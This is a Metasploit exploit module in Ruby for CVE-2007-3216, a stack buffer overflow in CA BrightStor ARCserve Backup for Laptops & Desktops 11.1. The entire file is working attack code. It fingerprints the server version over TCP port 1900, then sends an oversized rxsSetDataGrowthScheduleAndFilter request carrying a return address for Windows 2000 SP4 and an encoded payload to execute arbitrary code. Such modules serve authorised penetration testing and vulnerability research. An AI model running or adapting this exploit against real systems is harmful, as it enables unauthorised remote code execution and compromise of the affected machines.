##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CA BrightStor ARCserve for Laptops and Desktops LGServer rxsSetDataGrowthScheduleAndFilter Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        for Laptops & Desktops 11.1. By sending a specially crafted request (rxsSetDataGrowthScheduleAndFilter),
        an attacker could overflow the buffer and execute arbitrary code.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2007-3216' ],
          [ 'OSVDB', '35329' ],
          [ 'BID', '24348' ],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 700,
          'BadChars' => "\x00",
          'StackAdjustment' => -3500,
        },
      'Platform' => 'win',
      'Targets'  =>
        [
          [ 'Windows 2000 SP4 English',	{ 'Ret' => 0x75031dce } ],
        ],
      'DisclosureDate' => '2007-06-06',
      'DefaultTarget' => 0))

    register_options([ Opt::RPORT(1900) ])
  end

  def check

    connect

    sock.put("0000000019rxrGetServerVersion")
    ver = sock.get_once

    disconnect

    if ( ver and ver =~ /11\.1\.742/ )
        return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe

  end

  def exploit

    connect

    data = rand_text_alpha_upper(20080) + [target.ret].pack('V')
    data << payload.encoded + rand_text_alpha_upper(25000 - 20084 - payload.encoded.length)

    sploit  = "0000025000"				# Command Length Field
    sploit << "rxsSetDataGrowthScheduleAndFilter"	# RPC Command
    sploit << "~~"					# Constant Argument Delimiter
    sploit << data

    print_status("Trying target #{target.name}...")
    sock.put(sploit)

    handler
    disconnect

  end
end
